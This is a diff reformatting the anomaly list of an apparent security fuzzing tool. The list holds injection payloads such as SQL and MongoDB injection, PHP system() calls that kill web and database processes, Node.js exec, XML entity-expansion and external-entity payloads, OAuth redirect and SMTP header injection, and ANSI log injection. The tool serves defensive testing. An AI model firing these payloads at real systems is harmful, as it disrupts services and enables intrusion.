@@ -1,5 +1,4 @@
 # -*- coding: utf-8 -*-
-# pep8: disable=E501
 # pylint: disable=line-too-long
 """List of static anomalies that can be injected. Before using,
 replace mittn.org domain references with something you have control over.
@@ -46,8 +45,11 @@ anomaly_list = [
     "'; select @@version; --",  # MS SQL Server: show DB details
     "\\''; select @@version; --",  # MS SQL Server: show DB details, extra escape
     "&apos;&59; select @@version&59; --",  # MS SQL Server: show DB details, HTML entities
-    '/, "_id": /.*',  # End regex for MongoDB find function and inject a search parameter that matches all (and hope that makes the app barf)
-    '.*/, $where : function() { sleep(1000000) }, "_id": /.*',  # End regex for MongoDB find function and inject JavaScript code (that is hopefully slow enough)
+    # End regex for MongoDB find function and inject a search parameter that matches all
+    # (and hope that makes the app barf)
+    '/, "_id": /.*',
+    # End regex for MongoDB find function and inject JavaScript code (that is hopefully slow enough)
+    '.*/, $where : function() { sleep(1000000) }, "_id": /.*',
     '{ $ne : ""}',  # MongoDB match if parameter is not an empty string (and hopen that makes the app barf)
     '{ $where : function() { sleep(1000000) } }',  # MongoDB try to execute JavaScript that is slow
     '/.*/',  # MongoDB match everything as a regex (and again hope that breaks the app)
@@ -82,8 +84,10 @@ anomaly_list = [
     "php://filter/resource=/dev/zero",  # A naïve try to leverage PHP's filter wrapper
     "compress.zlib:///dev/zero",  # A naïve try to leverage PHP's compression wrapper
     "glob://*",  # A naïve try to leverage PHP's glob wrapper
-    '" . system(\'killall -g apache php nginx python perl node postgres bash\'); . "',  # E.g. PHP system exec, double quote insert
-    "' . system(\'killall -g apache php nginx python perl node postgres bash\'); . '",  # E.g. PHP system exec, single quote insert
+    # E.g. PHP system exec, double quote insert
+    '" . system(\'killall -g apache php nginx python perl node postgres bash\'); . "',
+    # E.g. PHP system exec, single quote insert
+    "' . system(\'killall -g apache php nginx python perl node postgres bash\'); . '",
     "require('assert').fail(0,1,'Node injection','');",  # Node.js command injection
     "var sys = require('assert'); sys.fail(0,1,'Node injection','');",  # Node.js command injection,
     "var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
@@ -110,13 +114,15 @@ anomaly_list = [
     'file:///dev/zero',
 
     # Stuff that tries to confuse broken OAuth processing
-    'eyJhbGciOiJub25lIn0K.eyJyZnAiOiJtaXR0biIsCiJ0YXJnZXRfdXJpIjoiaHR0cDovL21pdHRuLm9yZyJ9Cg==.',  # A JWT state parameter
+    'eyJhbGciOiJub25lIn0K.eyJyZnAiOiJtaXR0biIsCiJ0YXJnZXRfdXJpIjoiaHR0cDovL21pdHRuLm9yZyJ9Cg==.',  # JWT state parameter
     'redirect_uri',
     'state',
     "&access_token=DUMMY_TOKEN_FROM_MITTN&",
     "?access_token=DUMMY_TOKEN_FROM_MITTN&",
-    "&redirect_uri=http://mittn.org/attack&",   # Point to somewhere that returns an error; the test tool should follow redirects
-    "?redirect_uri=http://mittn.org/attack&",  # Point to somewhere that returns an error; the test tool should follow redirects
+    # Point to somewhere that returns an error; the test tool should follow redirects
+    "&redirect_uri=http://mittn.org/attack&",
+    # Point to somewhere that returns an error; the test tool should follow redirects
+    "?redirect_uri=http://mittn.org/attack&",
 
     # Timestamps
     "1969-12-31T11:59:59.99Z",  # Just before Unix epoch anywhere on Earth
@@ -183,12 +189,38 @@ anomaly_list = [
     "\xff\xfe",  # Illegal unicode as string
     "\xff\xff",  # Illegal unicode as string
     '\t',  # tab
-    '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion,
-    '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///dev/zero">]><foo>&bar;</foo>',  # XML external entity inclusion
-    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x02\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON (invalid Boolean value)
-    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x06\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON 2 (embedded document length overflow)
-    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x03\x00\x00\x00\x00\x00\x00',  # Broken BSON 3 (string length overflow)
-    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41',  # Broken BSON 4 (end zero missing and provide something for the parser to chew on)
+
+    # XML entity expansion
+    '<?xml version="1.0"?>'
+    '<!DOCTYPE exp [ <!ENTITY exp "exp">'
+    '<!ENTITY expa "' + '&exp;' * 100 + '">'
+    '<!ENTITY expan "' + '&expa;' * 100 + '">'
+    '<!ENTITY expand "' + '&expan;' * 100 + '"> ]>'
+    '<exp>&expand;</exp>',
+
+    # XML external entity inclusion
+    '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///dev/zero">]><foo>&bar;</foo>',
+
+    # Broken BSON (invalid Boolean value)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00'
+    'E@\x08Boolean\x00\x02\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',
+
+    # Broken BSON 2 (embedded document length overflow)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00'
+    'E@\x08Boolean\x00\x01\x04array\x00\x06\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',
+
+    # Broken BSON 3 (string length overflow)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00'
+    'E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x03\x00\x00\x00\x00\x00\x00',
+
+    # Broken BSON 4 (end zero missing and provide something for the parser to chew on)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00'
+    'E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00'
+    '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
+    '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
+    '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
+    '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
+    '\x41\x41\x41\x41\x41\x41\x41\x41',
 
     # Format strings
     r'%s',
@@ -197,7 +229,15 @@ anomaly_list = [
     # ANSI art makes your log files sparkle. These aren't likely to
     # get flagged by the tool, but if the test setup's log files are
     # viewed, these might highlight unwanted log injections
-    "\x1b[0;1;40;32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[32m TTT\x1b[0m \x1b[31mTTT\x1b[37m \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1b[32mMM\x1b[0m \x1b[1;32mMM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mNN\x1b[0m \x1b[1;34mN\r\n\x1b[32mM\x1b[0m \x1b[1;32mM\x1b[0m \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[0m  \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1a",
+    "\x1b[0;1;40;32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[32m TTT\x1b[0m \x1b[31mTTT\x1b[37m "
+    "\x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1b[32mMM\x1b[0m \x1b[1;32mMM\x1b[0m  \x1b[1;31mI\x1b[0m   "
+    "\x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mNN\x1b[0m \x1b[1;34mN\r\n\x1b[32mM\x1b[0m "
+    "\x1b[1;32mM\x1b[0m \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  "
+    "\x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   "
+    "\x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   "
+    "\x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[0m  \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m  "
+    "\x1b[1;34mN\r\n\x1a",
+
     "\x1b[2JPOSSIBLE_INJECTION_PROBLEM",  # Clear screen and show a message
     '\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07',  # BELs
 
@@ -208,7 +248,8 @@ anomaly_list = [
     '@',  # No user or domain
     'nobody@mittn.org\nCc:nobodyneither@mittn.org',  # Header injection
     'nobody@mittn.org\r\nCc:nobodyneither@mittn.org',  # Header injection
-    '\r\n.\r\n\r\nMAIL FROM:<root>\r\nRCPT TO:<nobody@mittn.org>\r\nDATA\r\nPOSSIBLE_INJECTION_PROBLEM\r\n.\r\n',  # SMTP injection
+    # SMTP injection
+    '\r\n.\r\n\r\nMAIL FROM:<root>\r\nRCPT TO:<nobody@mittn.org>\r\nDATA\r\nPOSSIBLE_INJECTION_PROBLEM\r\n.\r\n',
 
     # Long strings
     "A" * 256,
